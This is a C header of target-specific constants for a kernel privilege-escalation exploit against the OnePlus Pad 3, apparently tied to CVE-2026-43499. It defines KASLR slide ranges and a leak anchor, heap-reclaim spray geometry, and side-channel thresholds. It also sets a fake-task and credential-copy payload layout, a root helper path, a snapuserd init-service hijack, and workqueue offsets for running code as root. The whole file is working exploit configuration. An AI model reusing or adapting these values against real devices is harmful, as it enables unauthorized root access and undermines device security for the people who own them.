#ifndef TARGET_ONEPLUS_PAD3_EX01_CORE66_H
#define TARGET_ONEPLUS_PAD3_EX01_CORE66_H

/* Shared core66 capability selection. */
#define RMD_CORE66_TRANSACTIONAL_ROUTE 1
#define RMD_SUPERVISOR_DIRTY_GUARD 1
#define GHOSTLOCK_PRELOAD 1

/* OnePlus Pad 3 OPD2415, OxygenOS 16.0.9.400(EX01), SM8750P. */
#define BUILD_VARIANT_LABEL "oneplus_pad3_opd2415_ex01"
#define BUILD_FINGERPRINT "oneplus/opd2415in/op6190l1"
#define TARGET_LAYOUT_ID "opd2415-ex01-6.6.118-ab15114928"

/* VA_BITS=39 and the image's _text. */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET   0xffffff8000000000ULL

/* Exact xbl_config places the 0x23a0000-byte Image at 0xa8000000. Runtime
 * validation uses live kernel data because the boot header may be reclaimed. */
#define P0_PHYS_OFFSET 0x80000000ULL
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
#endif
#define P0_KERNEL_REGION_START 0xa8000000ULL
#define P0_KERNEL_REGION_SIZE  0x10000000ULL
#define P0_KERNEL_IMAGE_SIZE   0x023a0000ULL
#define P0_DISABLE_RUNTIME_PHYS_LOAD_OVERRIDE 1

/* Disable routes that cannot validate physical placement or safe cleanup. */
#define P0_DISABLE_DIRECT_ROOT_ROUTE 1

#define P0_DISABLE_RAW_WORKQUEUE_ROUTE 1

#define P0_DISABLE_RUNTIME_PSELECT_LAYOUT_OVERRIDE 1

#define DIRECT_WAITER_PI_CLEANUP 1

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE             0xffffff8000000000ULL
#define DIRECT_MAP_END              0xffffff9000000000ULL
#define VMEMMAP_START               0xfffffffe00000000ULL

/* BTF sizeof(mm_struct)=0x4c0; allocator extras round mm_cachep to 0x500. */
#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3

/* Runtime /sys/devices/system/cpu/possible is 0-7: 256 * 8 buckets. */
#define FUTEX_HASHSIZE 2048

/* MTE/KASAN are compiled in but production boot does not enable tagged heap. */
#define KS_MTE_TAGGED 0
#define KERNELSNITCH_THRESHOLD_MULT 10

/* Per-stage KernelSnitch diagnostics and synchronization. */
#define CORE66_TRANSACTIONAL_KERNELSNITCH_DIAGNOSTICS 1
#define CORE66_TRANSACTIONAL_KERNELSNITCH_READY_BARRIER 1
#define CORE66_TRANSACTIONAL_KERNELSNITCH_READY_TIMEOUT_MS 10000
#define CORE66_TRANSACTIONAL_KERNELSNITCH_CHILD_START_BARRIER 1
#define CORE66_TRANSACTIONAL_KERNELSNITCH_CHILD_START_TIMEOUT_MS 10000


/* Exact AF_UNIX reclaim geometry.  The matching OSS tree sets AF_UNIX
 * sk_allocation=GFP_KERNEL_ACCOUNT; BTF gives skb_shared_info=0x168 and
 * sk_buff=0xf0, both cache-line aligned below.  Device /proc/slabinfo reports
 * kmalloc-cg-4k as 4096-byte objects, 8 objects per order-3 slab. */
#define SKB_RECLAIM_STRICT_HARDENING       1
#define SKB_RECLAIM_SENDS                4
#define SKB_RECLAIM_SNDBUF               (1 << 20)
#define SKB_RECLAIM_SHINFO_SIZE          0x168
#define SKB_RECLAIM_SHINFO_ALIGNED       0x180
#define SKB_RECLAIM_SKB_ALIGNED          0x100
#define SKB_RECLAIM_MAX_HEAD             0x0e80
#define SKB_RECLAIM_HEAD_ONLY_SIZE       0x0e80
#define SKB_RECLAIM_TRUESIZE             0x9100
#define SKB_RECLAIM_MIN_EFFECTIVE_SNDBUF 0x24401
#define SKB_HEAD_GUARD_SLAB_ORDER        3
#define SKB_HEAD_GUARD_SLAB_OBJECTS      8
#define SKB_HEAD_GUARD_GROUPS            1
#define SKB_HEAD_GUARD_SENDS             8
#define SKB_HEAD_GUARD_FREES             4
#define SKB_HEAD_GUARD_HOLDERS           4

/* Diagnostic only: repeated exact-layout device observations hit 8.  Route
 * success remains gated by the configfs receipt and exact cleanup, never this
 * select return count. */
#define PSELECT_EXPECTED_READY 8

/* Pad 3 retry budget and dirty-state marker. */
#define PAYLOAD_ATTEMPT_BUDGET 8
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 180
#define PAYLOAD_DIRTY_MARKER_PREFIX \
  "/data/local/tmp/.oneplus-pad3-exploit-dirty"
#define PAYLOAD_DIRTY_MARKER_DIR "/data/local/tmp"

/* arm64 kaslr_early_init(), VA_BITS_MIN=39, MIN_KIMG_ALIGN=2 MiB.  The
 * physical Image is itself 2 MiB aligned on this target, so there is no extra
 * sub-block physical bias in the effective virtual slide. */
#define SLIDE_KASLR_MIN   0x1000000000ULL
#define SLIDE_KASLR_MAX   0x2fffe00000ULL
#define SLIDE_KASLR_ALIGN 0x00200000ULL

/* CONFIG_NF_LOG_SYSLOG=n; use random_table[uuid].data as the slide anchor. */
#define SLIDE_USE_RANDOM_UUID_LEAK 1

/* Exact stock Image bytes retained as artifact/extractor gates.  They are not
 * runtime gates because the head.S/embedded metadata pages are not all kept
 * immutable after boot. */
#define KPHYS_VALIDATION_COUNT 5
#define KPHYS_VALIDATION_0_OFFSET 0x00000000ULL
#define KPHYS_VALIDATION_0_VALUE  0x1473a819fa405a4dULL
#define KPHYS_VALIDATION_0_SIZE   8
#define KPHYS_VALIDATION_1_OFFSET 0x00000038ULL
#define KPHYS_VALIDATION_1_VALUE  0x00000000644d5241ULL
#define KPHYS_VALIDATION_1_SIZE   4
#define KPHYS_VALIDATION_2_OFFSET 0x00000040ULL
#define KPHYS_VALIDATION_2_VALUE  0x0000000000004550ULL
#define KPHYS_VALIDATION_2_SIZE   4
#define KPHYS_VALIDATION_3_OFFSET 0x01147e60ULL
#define KPHYS_VALIDATION_3_VALUE  0x54535f4746434b49ULL
#define KPHYS_VALIDATION_3_SIZE   8
#define KPHYS_VALIDATION_4_OFFSET 0x0170b944ULL
#define KPHYS_VALIDATION_4_VALUE  0x000000180001eb9fULL
#define KPHYS_VALIDATION_4_SIZE   8

/* Runtime physical-placement gate.  Route A reads these five live qwords via
 * the freshly established pipe primitive.  Three are relocated pointers tied
 * to the independently leaked KASLR base, one is the exact nf_logger type, and
 * one is immutable rodata. */
#define KPHYS_RUNTIME_LIVE_VALIDATION 1
#define KPHYS_NFULNL_NAME_PREFIX_VALUE 0x6e696c74656e666eULL
#define KPHYS_MEMSTART_ADDR_OFF   0x0167a548ULL
#define KPHYS_KIMAGE_VADDR_OFF    0x0167a5f8ULL
#define KPHYS_KIMAGE_VOFFSET_OFF  0x0167a600ULL

#include "offsets.h"
#include "struct-offsets.h"
#include "pselect-profile.h"

/* Exploit-internal payload page layout. */
#define LOCK_OFF      0x0e80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0f80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100
#define CRED_COPY_OFF           0x1080

/* Both adb and application paths stage the same exact helper artifact. */
#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_PATH    "/data/local/tmp/cve-2026-43499-root"

/* Verified from /system/etc/init/snapuserd.rc on the target device. */
#define INIT_HIJACK_SERVICE "snapuserd_proxy"
#define INIT_HIJACK_BINARY "/system/bin/snapuserd"
#define INIT_HIJACK_ARGUMENT "-socket-handoff"
#define INIT_HIJACK_HELPER_PATH "/data/local/tmp/rmdsu"

/* BTF-derived workqueue layouts for the exact 6.6 Image. */
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
#define WQ_DFL_PWQ_OFF        0xb0
#define PWQ_POOL_OFF          0x00
#define PWQ_WQ_OFF            0x08
#define PWQ_WORK_COLOR_OFF    0x10
#define PWQ_REFCNT_OFF        0x18
#define PWQ_NR_IN_FLIGHT_OFF  0x1c
#define PWQ_NR_ACTIVE_OFF     0x5c
#define PWQ_MAX_ACTIVE_OFF    0x60
#define POOL_WORKLIST_OFF     0x28
#define POOL_NR_IDLE_OFF      0x3c
#define WORK_DATA_OFF         0x00
#define WORK_ENTRY_OFF        0x08
#define WORK_FUNC_OFF         0x18

#endif
